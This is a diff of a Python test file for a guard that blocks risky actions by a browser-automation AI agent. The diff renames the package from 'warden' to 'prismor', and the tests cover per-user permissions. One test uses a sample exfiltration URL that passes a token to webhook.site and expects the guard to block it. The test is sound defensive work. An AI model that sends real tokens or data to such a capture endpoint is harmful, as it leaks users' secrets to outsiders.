@@ -15,13 +15,13 @@ _ADAPTER_SRC = Path(__file__).resolve().parent.parent / "adapters" / "browser-us
 if str(_ADAPTER_SRC) not in sys.path:
     sys.path.insert(0, str(_ADAPTER_SRC))
 
-from prismor.warden.browser_use import WardenBlocked, guard_controller  # noqa: E402
+from prismor.browser_use import PrismorBlocked, guard_controller  # noqa: E402
 
 
 def _make_controller():
     ctrl = MagicMock()
     ctrl.registry = MagicMock()
-    ctrl.registry.__warden_guarded__ = False
+    ctrl.registry.__prismor_guarded__ = False
     ctrl.registry.execute_action = AsyncMock(return_value="ok")
     return ctrl
 
@@ -58,7 +58,7 @@ def test_exfil_url_blocked_in_enforce(tmp_path):
     # webhook.site is a known exfil destination — hits the suspicious-network rule
     ctrl = _make_controller()
     guard_controller(ctrl, workspace=tmp_path, mode="enforce", raise_on_block=True)
-    with pytest.raises(WardenBlocked):
+    with pytest.raises(PrismorBlocked):
         _run(ctrl.registry.execute_action(
             "go_to_url",
             _params(url="https://webhook.site/abc123?token=mydata"),
@@ -100,7 +100,7 @@ def test_double_guard_is_idempotent(tmp_path):
 # ── per-user IAM ──────────────────────────────────────────────────────────────
 
 def _write_iam(workspace: Path) -> None:
-    iam_dir = workspace / ".prismor-warden"
+    iam_dir = workspace / ".prismor"
     iam_dir.mkdir(parents=True, exist_ok=True)
     (iam_dir / "iam.yaml").write_text(
         "agents:\n"
@@ -114,17 +114,17 @@ def _write_iam(workspace: Path) -> None:
 
 
 def test_per_user_iam_blocks_bob(tmp_path, monkeypatch):
-    monkeypatch.delenv("WARDEN_AGENT_ID", raising=False)
+    monkeypatch.delenv("PRISMOR_AGENT_ID", raising=False)
     _write_iam(tmp_path)
     ctrl = _make_controller()
     guard_controller(ctrl, workspace=tmp_path, mode="enforce",
                      subject="user:bob", raise_on_block=True)
-    with pytest.raises(WardenBlocked):
+    with pytest.raises(PrismorBlocked):
         _run(ctrl.registry.execute_action("go_to_url", _params(url="https://example.com")))
 
 
 def test_per_user_iam_allows_alice(tmp_path, monkeypatch):
-    monkeypatch.delenv("WARDEN_AGENT_ID", raising=False)
+    monkeypatch.delenv("PRISMOR_AGENT_ID", raising=False)
     _write_iam(tmp_path)
     ctrl = _make_controller()
     guard_controller(ctrl, workspace=tmp_path, mode="enforce",
@@ -136,9 +136,9 @@ def test_per_user_iam_allows_alice(tmp_path, monkeypatch):
 # ── use_subject multi-tenant ──────────────────────────────────────────────────
 
 def test_use_subject_per_request(tmp_path, monkeypatch):
-    monkeypatch.delenv("WARDEN_AGENT_ID", raising=False)
+    monkeypatch.delenv("PRISMOR_AGENT_ID", raising=False)
     _write_iam(tmp_path)
-    from warden.principal import use_subject
+    from prismor.runtime.principal import use_subject
 
     ctrl = _make_controller()
     guard_controller(ctrl, workspace=tmp_path, mode="enforce", raise_on_block=True)
@@ -147,6 +147,6 @@ def test_use_subject_per_request(tmp_path, monkeypatch):
         result = _run(ctrl.registry.execute_action("go_to_url", _params(url="https://example.com")))
     assert result == "ok"
 
-    with pytest.raises(WardenBlocked):
+    with pytest.raises(PrismorBlocked):
         with use_subject("user:bob"):
             _run(ctrl.registry.execute_action("go_to_url", _params(url="https://example.com")))
